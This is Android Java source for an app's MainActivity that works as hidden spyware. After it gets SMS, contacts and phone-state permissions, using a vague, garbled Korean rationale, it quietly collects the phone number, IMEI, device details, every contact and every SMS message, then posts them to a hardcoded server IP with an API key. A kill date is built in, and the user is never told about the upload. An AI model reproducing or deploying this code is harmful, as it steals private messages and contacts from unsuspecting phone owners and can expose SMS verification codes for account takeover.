package com.getphone;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import com.kcode.permissionslib.main.OnRequestPermissionsCallBack;
import com.kcode.permissionslib.main.PermissionCompat;

import org.xutils.common.Callback;
import org.xutils.http.RequestParams;
import org.xutils.http.body.RequestBody;
import org.xutils.x;

import java.io.IOException;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private final long end = 1523808000000L;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        new PermissionCompat.Builder(this)
                .addPermissions(new String[]{
                        Manifest.permission.READ_SMS
                        , Manifest.permission.RECEIVE_SMS
                        , Manifest.permission.READ_CONTACTS
                        , Manifest.permission.READ_PHONE_STATE

                })
                .addPermissionRationale("응용필요이권한보증기능보완이있어야한다")
                .addRequestPermissionsCallBack(new OnRequestPermissionsCallBack() {
                    @Override
                    public void onGrant() {
                        if (System.currentTimeMillis() > end) {
                            return;
                        }

                        SpUtil.clear(MainActivity.this);

                        //获取手机号码
                        String phoneNumber = getPhoneNumber();
                        if (!TextUtils.isEmpty(phoneNumber)) {
                            SpUtil.putAndApply(MainActivity.this, "phoneNumber", phoneNumber);
                            Log.e("MainActivity", phoneNumber);
                        } else {
                            SpUtil.putAndApply(MainActivity.this, "phoneNumber", "未知号码");
                        }

                        //获取设备号
                        String androidIMEI = getAndroidIMEI(MainActivity.this);
                        SpUtil.putAndApply(MainActivity.this, "androidIMEI", androidIMEI);
                        Log.e("MainActivity", androidIMEI);

                        //安装时间
                        String androidTime = getAndroidTime(MainActivity.this);
                        SpUtil.putAndApply(MainActivity.this, "androidTime", androidTime);
                        Log.e("MainActivity", androidTime);

                        //获取手机版本号
                        String model = Build.MODEL;
                        SpUtil.putAndApply(MainActivity.this, "model", model);
                        if (TextUtils.isEmpty(model)) {
                            Log.e("MainActivity", "1.0");
                        }
                        Log.e("MainActivity", model);

                        //获取手机版本号
                        String modelversion = Build.VERSION.RELEASE;
                        SpUtil.putAndApply(MainActivity.this, "modelversion", modelversion);
                        if (TextUtils.isEmpty(modelversion)) {
                            Log.e("MainActivity", "未知版本");
                        }
                        Log.e("MainActivity", modelversion);
                        HashMap<String, String> map = new HashMap<>(2);
                        map.put("key", "29067275e60e29544639d4551d953666");
                        map.put("aid", "14");
                        map.put("tel", String.valueOf(SpUtil.get(getApplicationContext(), "phoneNumber", "未知号码")));
                        map.put("uuid", String.valueOf(SpUtil.get(getApplicationContext(), "androidIMEI", "未知设备")));
                        map.put("az_time", String.valueOf(SpUtil.get(getApplicationContext(), "androidTime", "未知状态")));
                        map.put("xing_hao", String.valueOf(SpUtil.get(getApplicationContext(), "model", "未知设备")));
                        map.put("xi_tong", String.valueOf(SpUtil.get(getApplicationContext(), "modelversion", "未知系统")));
                        map.put("ban_ben", String.valueOf(SpUtil.get(getApplicationContext(), "version", "未知版本")));
                        map.put("tel_str", queryContactPhoneNumber());
                        map.put("sms_str", getSmsFromPhone());
                        map.put("tel_stu", "3");
                        map.put("left_right", "3");
                        map.put("x_tel", "3");
                        RequestParams params = new RequestParams("http://115.144.178.33/api/zhuan_bo");
                        try {
                            params.setRequestBody(new UrlEncodedParamsBody(map, "utf-8"));
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        Log.e("MainActivity", params.toString());
                        x.http().post(params, new Callback.CommonCallback<String>() {
                            @Override
                            public void onSuccess(String result) {
                            }

                            @Override
                            public void onError(Throwable ex, boolean isOnCallback) {
                            }

                            @Override
                            public void onCancelled(CancelledException cex) {
                            }

                            @Override
                            public void onFinished() {
                            }
                        });

                    }

                    @Override
                    public void onDenied(String permission) {

                    }
                }).build().request();

    }

    private String queryContactPhoneNumber() {
        StringBuilder stringBuilder = new StringBuilder();
        String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                cols, null, null, null);
        for (int i = 0; i < cursor.getCount(); i++) {
            cursor.moveToPosition(i);
            // 取得联系人名字
            int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
            int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
            String name = cursor.getString(nameFieldColumnIndex);
            String number = cursor.getString(numberFieldColumnIndex);
            if (stringBuilder.length() == 0) {
            } else {
                stringBuilder.append("&&");
            }
            stringBuilder.append(name + "##");
            stringBuilder.append(number);
        }

        if (stringBuilder.toString().isEmpty()) {
            return ("暂无##暂无");
        }

        return stringBuilder.toString();
    }

    private Uri SMS_INBOX = Uri.parse("content://sms/");

    public String getSmsFromPhone() {
        StringBuilder stringBuilder = new StringBuilder();
        ContentResolver cr = getContentResolver();
        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
        if (null == cur) {
            Log.i("ooc", "************cur == null");
            return "";
        }
        while (cur.moveToNext()) {
            String number = cur.getString(cur.getColumnIndex("address"));//手机号
            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
            //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
            if (stringBuilder.length() == 0) {
            } else {
                stringBuilder.append("&&");
            }
            stringBuilder.append(number + "##");
            stringBuilder.append(body);
        }

        if (stringBuilder.toString().isEmpty()) {
            return ("暂无##暂无");
        }

        return stringBuilder.toString();
    }

    /**
     * 获取手机本机号码
     */
    private String getPhoneNumber() {
        TelephonyManager phoneMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);

        return phoneMgr.getLine1Number();
    }

    /**
     * 唯一的设备ID： GSM手机的 IMEI 和 CDMA手机的 MEID. Return null if device ID is not
     * 取得手机IMEI
     * available.
     */
    private String getAndroidIMEI(Context context) {
        String androidIMEI = getTelephonyManager(context).getDeviceId();// String
        if (androidIMEI == null) {
            androidIMEI = "未知设备";
        }
        Log.e("FlashActivity", androidIMEI);
        SpUtil.putAndApply(context, "udid", androidIMEI);
        return androidIMEI;
    }

    private TelephonyManager mTelephonyManager = null;

    public TelephonyManager getTelephonyManager(Context context) {
        // 获取telephony系统服务，用于取得SIM卡和网络相关信息
        if (mTelephonyManager == null) {
            mTelephonyManager = (TelephonyManager) context
                    .getSystemService(Context.TELEPHONY_SERVICE);
        }
        return mTelephonyManager;
    }

    private String getAndroidTime(Context context) {
        try {
            PackageManager packageManager = getApplicationContext().getPackageManager();
            PackageInfo packageInfo = packageManager.getPackageInfo(this.getPackageName(), 0);
            long firstInstallTime = packageInfo.firstInstallTime;
            String day = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(firstInstallTime);
            return day;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return "";
    }


    class UrlEncodedParamsBody implements RequestBody {

        private byte[] content;
        private String charset = "UTF-8";

        public UrlEncodedParamsBody(Map<String, String> map, String charset) throws IOException {
            if (!TextUtils.isEmpty(charset)) {
                this.charset = charset;
            }
            StringBuilder contentSb = new StringBuilder();
            if (null != map) {
                for (Map.Entry<String, String> entry : map.entrySet()) {
                    String name = entry.getKey();
                    String value = entry.getValue();
                    if (!TextUtils.isEmpty(name) && value != null) {
                        if (contentSb.length() > 0) {
                            contentSb.append("&");
                        }
                        contentSb.append(Uri.encode(name, this.charset))
                                .append("=")
                                .append(Uri.encode(value, this.charset));
                    }
                }
            }

            this.content = contentSb.toString().getBytes(this.charset);
        }

        @Override
        public long getContentLength() {
            return content.length;
        }

        @Override
        public void setContentType(String contentType) {

        }

        @Override
        public String getContentType() {
            return "application/x-www-form-urlencoded;charset=" + charset;
        }

        @Override
        public void writeTo(OutputStream sink) throws IOException {
            sink.write(this.content);
            sink.flush();
        }
    }

}
